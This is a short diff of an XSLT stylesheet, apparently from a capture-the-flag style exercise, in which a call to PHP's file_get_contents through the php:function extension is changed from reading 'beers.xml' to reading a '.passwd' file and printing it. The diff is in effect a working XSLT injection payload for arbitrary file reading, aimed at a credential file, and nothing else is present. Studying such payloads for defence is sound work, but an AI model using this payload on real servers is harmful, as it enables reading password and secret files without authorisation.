@@ -4,7 +4,7 @@
       xmlns:php="http://php.net/xsl">
   <xsl:template match="/">
     <pre>
-<xsl:value-of select="php:function('file_get_contents', 'beers.xml')" />
+<xsl:value-of select="php:function('file_get_contents', '.passwd')" />
     </pre>
   </xsl:template>
 </xsl:stylesheet>
